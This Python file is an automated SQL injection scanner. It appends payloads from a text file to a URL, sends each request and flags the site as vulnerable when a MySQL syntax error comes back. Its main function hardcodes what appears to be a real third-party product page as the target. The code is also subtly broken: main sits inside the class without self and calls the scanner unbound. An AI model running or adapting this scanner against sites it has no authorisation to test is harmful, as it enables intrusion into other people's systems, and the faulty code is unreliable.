#!/usr/bin/python3
# -*- encoding: utf-8 -*-

import os
import urllib.request


class Invpal_005:

    def __init__(self):
        """
        sql injection
        """

    def sql_injection(self, fullurl):
        global lst_msg
        errormsg = "You have an error in your SQL syntax"
        errorr = "yes"
        fullbody = ""

        os.chdir("SQL_XSS")
        fname = "payloadSQL.txt"
        with open(fname) as f:
            content = f.readlines()
        payloads = [x.strip() for x in content]
        lst_msg = []

        for payload in payloads:
            try:
                payload = payload
                fullpayload = fullurl + payload
                print(fullpayload)
                lst_msg.append(fullpayload)
                resp = urllib.request.urlopen(fullurl + payload)
                body = resp.read()
                # print(body)
                fullbody = body.decode('utf-8')
                # print(fullbody)
            except:
                msg_error = "[-] Try another paylod " + payload
                lst_msg.append(msg_error)
                # print(msg_error)
                # print(error)
                errorr = "no"
                # sys.exit()
            if errormsg in fullbody:
                if errorr == "no":
                    msg_payload = "[-] That payload might not work!"
                    print(msg_payload)
                    lst_msg.append(msg_payload)
                    errorr = "yes"
                else:
                    msg_injection = "[+] The website is SQL injection vulnerable! Payload: " + payload
                    print(msg_injection)
                    lst_msg.append(msg_injection)
                    lst_msg.append(body)
                    print(body)
            else:
                msg_not_inject = "[-] The website is not SQL injection vulnerable!"
                print(msg_not_inject)
                lst_msg.append(msg_not_inject)

        self.write_file()
        os.chdir("..")

    def write_file(self):

        fwrite = "../Salida/invpal-005-mysql.txt"
        f = open(fwrite, "a")
        for cadena in lst_msg:
            f.write(cadena)
            f.write("\n")
        f.close()

    def main():
        url = "http://www.tunesoman.com/product.php?id="
        sql_injection(url)

    